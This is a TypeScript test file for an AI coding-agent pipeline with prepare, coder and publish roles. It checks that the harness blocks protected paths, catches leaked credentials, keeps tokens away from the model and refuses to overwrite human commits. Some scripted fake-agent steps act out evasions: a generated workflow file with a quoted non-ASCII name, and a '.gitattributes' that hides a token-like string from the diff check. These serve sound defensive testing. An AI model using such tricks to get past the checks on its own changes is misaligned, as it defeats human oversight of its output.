    git(w.root, 'clone', '-q', w.remote, tmp);
    git(tmp, 'switch', '-q', '-c', BRANCH);
    writeFileSync(join(tmp, 'README.md'), 'human work\n');
    git(tmp, 'commit', '-q', '-am', 'a human was here');
    git(tmp, 'push', '-q', 'origin', BRANCH);
    const before = git(w.remote, 'rev-parse', BRANCH);
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('failed');
    expect(publish.doc!.error).toMatch(/refusing to overwrite it; nothing was pushed/);
    expect(git(w.remote, 'rev-parse', BRANCH)).toBe(before);
  });

  it("replaces this attempt's own earlier push, with a lease on what it saw", async () => {
    const w = makeWorld();
    const tmp = join(w.root, 'orphan');
    git(w.root, 'clone', '-q', w.remote, tmp);
    git(tmp, 'switch', '-q', '-c', BRANCH);
    writeFileSync(join(tmp, 'src', 'app.sh'), 'greet() {\n  echo hello # earlier run\n}\n');
    git(tmp, 'commit', '-q', '-am', `fix: earlier run\n\nHephaisto-Attempt: ${ATTEMPT}`);
    git(tmp, 'push', '-q', 'origin', BRANCH);
    await upToPublish(w);
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('pr_opened');
    expect((publish.doc!.deviations as string[]).join(' ')).toMatch(/already existed from an earlier run/);
    expect(git(w.remote, 'log', '-1', '--format=%s', BRANCH)).toBe('fix(svc): greet is deterministic');
  });

  it('a protected path whose name git would print in quotes is still a protected path', async () => {
    const w = makeWorld();
    script(w, 'svc.implement.json', {
      steps: [
        { tool: 'Write', input: { file_path: '{{target}}/gen.sh', content: 'mkdir -p .github/workflows && echo "on: push" > ".github/workflows/\u00e9vil.yml"\n' } },
        { tool: 'Bash', input: { command: 'sh gen.sh' } },
        { commit: 'chore: generate' },
        { result: { cost_usd: 0.3, structured_output: { files: ['gen.sh'], deviations: [] } } },
      ],
    });
    const { doc } = await runRequest(w, implementRequest(w));
    expect(doc.outcome).toBe('policy_diff');
    expect(doc.error).toMatch(/\.github\/workflows\/.*vil\.yml is a protected path/);
    expect(doc.files).toContain('gen.sh');
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });

  it('a .gitattributes in the diff cannot hide a credential from the policy check', async () => {
    const w = makeWorld();
    script(w, 'svc.implement.json', {
      steps: [
        { tool: 'Write', input: { file_path: '{{target}}/.gitattributes', content: '* -diff\n' } },
        { append: { path: 'src/app.sh', text: '# ghp_0123456789abcdefghij0123456789abcdef\n' } },
        { commit: 'oops' },
        { result: { cost_usd: 0.3, structured_output: { files: ['src/app.sh', '.gitattributes'], deviations: [] } } },
      ],
    });
    const { doc } = await runRequest(w, implementRequest(w));
    expect(doc.outcome).toBe('policy_diff');
    expect(doc.error).toMatch(/credential/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });
});

// =============================================================================================

describe('reading what another role could have replaced', () => {
  it('readUntrusted takes a regular file, within its cap, and nothing else', () => {
    const w = makeWorld();
    const f = join(w.root, 'f');
    writeFileSync(f, 'hello');
    expect(readUntrusted(f, 100).toString()).toBe('hello');
    expect(() => readUntrusted(f, 4)).toThrow(/too large/);
    symlinkSync(f, join(w.root, 'link'));
    expect(() => readUntrusted(join(w.root, 'link'), 100)).toThrow(/ELOOP|symbolic/i);
    expect(() => readUntrusted(w.root, 100)).toThrow(/not a regular file|EISDIR/);
    expect(() => readUntrusted(join(w.root, 'absent'), 100)).toThrow(/ENOENT/);
  });

  it('copyUntrusted stops at its cap and does not follow a link', async () => {
    const w = makeWorld();
    const f = join(w.root, 'big');
    writeFileSync(f, Buffer.alloc(3000, 1));
    await expect(copyUntrusted(f, join(w.root, 'copy1'), 2000)).rejects.toThrow(/too large/);
    expect(await copyUntrusted(f, join(w.root, 'copy2'), 4000)).toBe(3000);
    expect(readFileSync(join(w.root, 'copy2')).length).toBe(3000);
    symlinkSync(f, join(w.root, 'biglink'));
    await expect(copyUntrusted(join(w.root, 'biglink'), join(w.root, 'copy3'), 4000)).rejects.toThrow(/ELOOP|symbolic/i);
  });

  it('both handoff schemas are closed: an unknown key is a refusal', async () => {
    const w = makeWorld();
    await upToPublish(w);
    const prep = readJson(handoff(w, 'prepare.json'));
    expect(PrepareHandoffZ.safeParse(prep).success).toBe(true);
    expect(PrepareHandoffZ.safeParse({ ...prep, token: 'x' }).success).toBe(false);
    expect(PrepareHandoffZ.safeParse({ ...prep, handoff_version: 2 }).success).toBe(false);
    const ch = readJson(handoff(w, 'coder.json'));
    expect(CoderHandoffZ.safeParse(ch).success).toBe(true);
    expect(CoderHandoffZ.safeParse({ ...ch, role: 'prepare' }).success).toBe(false);
    expect(() => {
      writeFileSync(handoff(w, 'coder.json'), '[]');
      readCoderHandoff(join(w.work, 'handoff'));
    }).toThrow(HandoffError);
  });
});

// =============================================================================================

describe('verification without feed credentials', () => {
  // A stand-in for a .NET repository on a private feed: `restore` can fetch only with the token
  // (and leaves the cache behind), `build` fails the way NuGet does when the fix needs a package
  // that is not in that cache, and `test` refuses to run if it can see the token.
  const commands = {
    restore: 'sh -c \'if [ -n "$token" ]; then mkdir -p "$NUGET_PACKAGES" && touch "$NUGET_PACKAGES/.cached"; else test -f "$NUGET_PACKAGES/.cached"; fi\'',
    build:
      'sh -c \'if grep -q newpkg src/app.sh; then echo "error NU1301: Unable to load the service index for source https://nuget.pkg.github.com/TrueRelevance/index.json. Response status code does not indicate success: 401 (Unauthorized)."; exit 1; fi\'',
    test: 'sh -c \'if [ -n "$token$username$GITHUB_TOKEN$NUGET_GITHUB_TOKEN$CODEFIX_GIT_PASSWORD" ]; then echo "FAIL: a credential is visible to the tests"; exit 1; fi; sh test.sh\'',
  };

  it('builds and tests from the cache the pre-restore filled, and the tests see no credential', async () => {
    const w = makeWorld({ commands });
    script(w, 'svc.implement.json', okImplement());
    const req = implementRequest(w);
    await runRole(w, 'prepare', req, TOKENS);
    expect(existsSync(join(w.work, 'nuget', 'packages', '.cached'))).toBe(true);
    await runRole(w, 'coder', req);
    const publish = await runRole(w, 'publish', req, { GITHUB_TOKEN: GH });
    expect(publish.doc).toMatchObject({ outcome: 'pr_opened', build_passed: true, tests_passed: true });
    expect((publish.doc!.deviations as string[]).join(' ')).not.toMatch(/pre-restore failed/);
  });

  it('the same holds when every role runs in one process', async () => {
    const w = makeWorld({ commands });
    script(w, 'svc.implement.json', okImplement());
    const { doc } = await runRequest(w, implementRequest(w), TOKENS);
    expect(doc).toMatchObject({ outcome: 'pr_opened', build_passed: true, tests_passed: true });
    for (const token of [GH, NUGET]) expect(filesContaining(w.work, token)).toEqual([]);
  });

  it('a fix that needs a package the cache lacks says so in plain words, not as a bare 401', async () => {
    const w = makeWorld({ commands });
    await upToPublish(w, {
      steps: [
        { append: { path: 'src/app.sh', text: '# uses newpkg\n' } },
        { commit: 'fix: use newpkg' },
        { result: { cost_usd: 0.4, structured_output: { files: ['src/app.sh'], deviations: [] } } },
      ],
    });
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc).toMatchObject({ outcome: 'build_failed', build_passed: false, pr_url: null });
    expect(publish.doc!.error).toMatch(/build failed \(exit 1\).*nothing was pushed\. It could not get a package: verification has no feed credentials/);
    const deviations = (publish.doc!.deviations as string[]).join('\n');
    expect(deviations).toMatch(/Verification runs without package-feed credentials \(they stay in the prepare container/);
    expect(deviations).toMatch(/most likely this change adds or bumps a package reference/);
    expect(deviations).toMatch(/NU1301/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });

  it('a pre-restore the feed refused names the Secret key to look at', async () => {
    const w = makeWorld({ commands: { ...commands, restore: 'sh -c \'echo "error NU1301: Unable to load the service index. 401 (Unauthorized)"; exit 1\'' } });
    script(w, 'svc.implement.json', okImplement());
    const req = implementRequest(w);
    await runRole(w, 'prepare', req, { GITHUB_TOKEN: GH });
    expect(readPrepareHandoff(sealDir(w))!.deviations.join(' ')).toMatch(/pre-restore failed \(exit 1\).*package feed refusing the request.*is NUGET_GITHUB_TOKEN in the coder Secret/);
  });

  it('feedRefusal knows the lines a feed without credentials produces, and no others', () => {
    expect(feedRefusal('  error NU1301: Unable to load the service index for source https://x/index.json.')).toMatch(/^error NU1301/);
    expect(feedRefusal('error NU1101: Unable to find package Cait. No packages exist with this id in source(s): nuget.org')).toMatch(/NU1101/);
    expect(feedRefusal('Response status code does not indicate success: 403 (Forbidden).')).toMatch(/403/);
    expect(feedRefusal('npm error code E401')).toMatch(/E401/);
    expect(feedRefusal("System.IO.IOException: Read-only file system : '/work/nuget/packages/humanizer.core'")).toMatch(/Read-only/);
    expect(feedRefusal("Access to the path '/work/nuget/packages/x/1.0.0' is denied.")).toMatch(/denied/);
    expect(feedRefusal('error CS0246: The type or namespace name Foo could not be found')).toBeNull();
    expect(feedRefusal('Test run failed. 4011 passed')).toBeNull();
  });
});

// =============================================================================================

describe('investigate: the clones happen where the token is, the model runs where it is not', () => {
  let stub: McpStub;

  beforeEach(async () => {
    stub = await startMcpStub({ token: ENDPOINT_TOKEN });
  });

  afterEach(async () => {
    await stub.close();
  });

  it('prepare clones dev-context and the source; coder, with no GitHub token, concludes and confirms the code reference', async () => {
    const w = makeWorld();
    const src = makeSourceRepo(w);
    const req = investigateRequest(w, stub.url, {
      source: { url: src.url, default_branch: 'main', path: '', ref: src.sha, image: `ghcr.io/flou21/hephaisto-fixture-dotnet:c15-${src.sha}` },
    });
    const shipped = { CODEFIX_FAKE_SCRIPT_DIR: join(APP_ROOT, 'fake-scripts') };
    const prepare = await runRole(w, 'prepare', req, { GITHUB_TOKEN: GH, ...shipped });
    expect(prepare).toMatchObject({ stdout: '', doc: null, exitCode: 0 });
    expect(stub.requests).toHaveLength(0); // prepare has no business with the endpoint
    expect(readPrepareHandoff(join(w.work, 'handoff'))).toMatchObject({ phase: 'investigate', terminal: null, repo_dir: 'shop', source: { cloned: true, analysed_ref: src.sha, error: null } });

    const coder = await runRole(w, 'coder', req, shipped);
    expect(validate('investigate', coder.doc).errors).toEqual([]);
    expect(coder.doc).toMatchObject({ attempt_id: INVESTIGATE_ATTEMPT, outcome: 'concluded', billing: 'fake', error: null, source: { cloned: true, analysed_ref: src.sha, error: null } });
    expect(coder.doc!.context_sha).toBe(git(w.context, 'rev-parse', 'HEAD'));
    expect(coder.doc!.code_refs).toEqual([{ finding: 0, path: 'src/Shop.Api/Startup/Endpoints.cs', line: 17, end_line: null, note: 'options.Endpoints.Count is read without a null check' }]);
    expect(stub.calls.map((c) => c.name)).toEqual(['list_pods', 'get_pod_logs', 'conclude', 'propose_plan']);
    expect(filesContaining(w.work, GH)).toEqual([]);
    expect(filesContaining(w.work, ENDPOINT_TOKEN)).toEqual([]);
    expect(coder.stdout).not.toContain(ENDPOINT_TOKEN);
  });

  it('without a source there is still a prepare: dev-context is private, and the model never gets its token', async () => {
    const w = makeWorld();
    const req = investigateRequest(w, stub.url);
    const shipped = { CODEFIX_FAKE_SCRIPT_DIR: join(APP_ROOT, 'fake-scripts') };
    await runRole(w, 'prepare', req, { GITHUB_TOKEN: GH, ...shipped });
    const refused = await runRole(w, 'coder', req, { GITHUB_TOKEN: GH, ...shipped });
    expect(refused.doc!.error).toMatch(/refuses to start while GITHUB_TOKEN is set/);
    expect(stub.calls).toHaveLength(0);
    const coder = await runRole(w, 'coder', req, shipped);
    expect(coder.doc).toMatchObject({ outcome: 'concluded', source: null, code_refs: [] });
  });

  it('a dev-context that cannot be cloned ends the run in prepare, and coder prints it with its own billing', async () => {
    const w = makeWorld();
    const req = investigateRequest(w, stub.url);
    req.context = { repository_url: `file://${join(w.root, 'nowhere')}`, ref: 'main' };
    expect(await runRole(w, 'prepare', req, { GITHUB_TOKEN: GH })).toMatchObject({ stdout: '', exitCode: 0 });
    const coder = await runRole(w, 'coder', req);
    expect(validate('investigate', coder.doc).errors).toEqual([]);
    expect(coder.doc).toMatchObject({ outcome: 'failed', billing: 'fake', context_sha: null });
    expect(coder.doc!.error).toMatch(/git clone/);
    expect(stub.requests).toHaveLength(0); // no model, and no endpoint call either
  });

  it('a source that cannot be cloned is reported and the investigation goes on, as before', async () => {
    const w = makeWorld();
    const req = investigateRequest(w, stub.url, { source: { url: `file://${join(w.root, 'no-such.git')}`, default_branch: 'main', path: '', ref: null, image: null } });
    const shipped = { CODEFIX_FAKE_SCRIPT_DIR: join(APP_ROOT, 'fake-scripts') };
    await runRole(w, 'prepare', req, { GITHUB_TOKEN: GH, ...shipped });
    const coder = await runRole(w, 'coder', req, shipped);
    expect(coder.doc!.outcome).toBe('concluded');
    expect(coder.doc!.source).toMatchObject({ cloned: false, analysed_ref: null });
    expect((coder.doc!.source as { error: string }).error).toMatch(/git clone/);
  });
});

// =============================================================================================

describe('signals, by role', () => {
  it('a coder container of an implement Job that is told to stop prints nothing: it is not the one Hephaisto reads', async () => {
    const w = makeWorld();
    if (!existsSync(join(APP_ROOT, 'dist', 'main.js'))) execFileSync('npx', ['tsc', '-p', 'tsconfig.json'], { cwd: APP_ROOT });
    script(w, 'svc.implement.json', { steps: [{ sleep_ms: 60_000 }] });
    const req = implementRequest(w);
    await runRole(w, 'prepare', req, TOKENS);
    const child = spawn('node', [join(APP_ROOT, 'dist', 'main.js')], {
      env: { PATH: process.env.PATH, CODEFIX_ROLE: 'coder', CODEFIX_REQUEST: join(w.root, 'in', 'request.json'), CODEFIX_SDK: 'fake', CODEFIX_FAKE_SCRIPT_DIR: w.scripts, CODEFIX_WORK_DIR: w.work, CODEFIX_GH: 'shim' },
    });
    let stdout = '';
    let err = '';
    child.stdout.on('data', (d) => (stdout += d));
    let sent = false;
    child.stderr.on('data', (d) => {
      err += d;
      if (!sent && /FAKE SDK script/.test(err)) {
        sent = true;
        child.kill('SIGTERM');
      }
    });
    const code = await new Promise<number | null>((res) => child.on('close', res));
    expect(code).toBe(143);
    expect(stdout).toBe('');
    expect(err).toMatch(/received SIGTERM in the coder role/);
    expect(existsSync(handoff(w, 'coder.json'))).toBe(false);
  });
});
